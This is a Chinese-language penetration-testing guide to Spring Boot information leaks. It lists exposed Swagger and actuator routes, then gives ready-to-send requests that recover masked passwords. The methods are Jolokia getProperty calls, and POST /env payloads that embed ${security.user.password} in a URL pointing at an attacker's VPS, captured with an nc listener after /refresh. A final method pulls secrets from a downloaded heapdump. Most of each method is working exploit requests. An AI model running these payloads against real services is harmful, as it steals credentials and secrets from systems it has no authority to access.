# 信息泄漏

## 一.路由地址及接口调用详情泄漏

> 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等

直接访问以下两个 swagger 相关路由，验证漏洞是否存在：

```
/v2/api-docs
/swagger-ui.html
```

其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：

```
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
```

**一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞**，但是以 "**默认安全**" 来讲，不暴露出这些信息更加安全。

对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。

## 二.配置不当暴漏路由

> 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置

参考 [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) 和 [spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)，可能因为配置不当而暴露的默认内置路由可能会有：

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
```

其中对寻找漏洞比较重要接口的有：

*   `/env`、`/actuator/env`

    GET 请求 `/env` 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；

    同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。
*   `/refresh`、`/actuator/refresh`

    POST 请求 `/env` 接口设置属性后，可同时配合 POST 请求 `/refresh` 接口刷新属性变量来触发相关 RCE 漏洞。
*   `/restart`、`/actuator/restart`

    暴露出此接口的情况较少；可以配合 POST请求 `/env` 接口设置属性后，再 POST 请求 `/restart` 接口重启应用来触发相关 RCE 漏洞。
*   `/jolokia`、`/actuator/jolokia`

    可以通过 `/jolokia/list` 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。
*   `/trace`、`/actuator/httptrace`

    一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。

## 三.获取星号脱敏密码的明文

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

### 0x01：获取被星号脱敏的密码的明文 (方法一)

**利用条件：**

* 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
* 目标使用了 `jolokia-core` 依赖（版本要求暂未知）

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： jolokia 调用相关 Mbean 获取明文**

将下面示例中的 `security.user.password` 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 `value` 键中。

* 调用 `org.springframework.boot` Mbean

> 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

* 调用 `org.springframework.cloud.context.environment` Mbean

> 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

* 调用其他 Mbean

> 目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。

### 0x02：获取被星号脱敏的密码的明文 (方法二)

**利用条件：**

* 可以 GET 请求目标网站的 `/env`
* 可以 POST 请求目标网站的 `/env`
* 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
* 目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
* 目标可以请求攻击者的服务器（请求可出外网）

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 使用 nc 监听 HTTP 请求**

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

**步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性**

将下面 `http://value:${security.user.password}@your-vps-ip` 中的 `security.user.password` 换成自己想要获取的对应的星号 \* 遮掩的属性名；

`your-vps-ip` 换成自己外网服务器的真实 ip 地址。

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
```

**步骤四： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

**步骤五： 解码属性值**

正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：

```
Authorization: Basic dmFsdWU6MTIzNDU2
```

将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值 `value:123456`，其中的 `123456` 即是目标星号 \* 脱敏前的属性值明文。

### 0x03：获取被星号脱敏密码的明文 (方法三)

**利用条件：**

* 通过 POST `/env` 设置属性触发目标对外网指定地址发起任意 http 请求
* 目标可以请求攻击者的服务器（请求可出外网）

**利用方法：**

> 参考 UUUUnotfound 提出的 [issue-1](https://github.com/LandGrey/SpringBootVulExploit/issues/1)，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 使用 nc 监听 HTTP 请求**

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

**步骤三： 触发对外 http 请求**

* `spring.cloud.bootstrap.location` 方法（**同时适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
```

* `eureka.client.serviceUrl.defaultZone` 方法（**不适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
```

**步骤四： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

### 0x04：获取被星号脱敏密码的明文 (方法四)

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

**利用条件：**

* 可正常 GET 请求目标 `/heapdump` 或 `/actuator/heapdump` 接口

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 下载 jvm heap 信息**

> 下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G

`GET` 请求目标的 `/heapdump` 或 `/actuator/heapdump` 接口，下载应用实时的 JVM 堆信息

**步骤三： 使用 MAT 获得 jvm heap 中的密码明文**

参考 [文章](https://landgrey.me/blog/16/) 方法，使用 [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) 工具的 **OQL** 语句

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))

或

select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))
```

辅助用 "**password**" 等关键词快速过滤分析，获得密码等相关敏感信息的明文
